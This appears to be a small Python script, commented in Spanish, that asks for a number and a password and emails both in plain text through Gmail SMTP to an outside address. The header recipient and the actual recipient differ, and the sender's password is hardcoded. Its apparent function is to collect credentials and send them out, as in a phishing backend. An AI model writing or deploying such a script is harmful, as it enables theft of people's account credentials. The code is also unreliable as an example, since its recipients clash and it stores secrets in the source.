import smtplib
from email.mime.text import MIMEText

# Configuración del servidor SMTP
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_SENDER = "tuemail@gmail.com"  # Cambia por tu correo
EMAIL_PASSWORD = "tucontraseña"     # Cambia por tu contraseña

# Datos a enviar
numero = input("Ingrese el número: ")
password = input("Ingrese la contraseña: ")

# Crear mensaje
mensaje = f"Número: {numero}\nContraseña: {password}"
msg = MIMEText(mensaje)
msg["Subject"] = "Datos Recibidos"
msg["From"] = EMAIL_SENDER
msg["To"] = "echoesggalaxy@gmail.com"  # Cambia por el correo de destino

try:
    # Conectar al servidor SMTP y enviar el correo
    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.starttls()
    server.login(EMAIL_SENDER, EMAIL_PASSWORD)
    server.sendmail(EMAIL_SENDER, "destinatario@gmail.com", msg.as_string())
    server.quit()
    print("Correo enviado exitosamente.")
except Exception as e:
    print("Error al enviar el correo:", e)
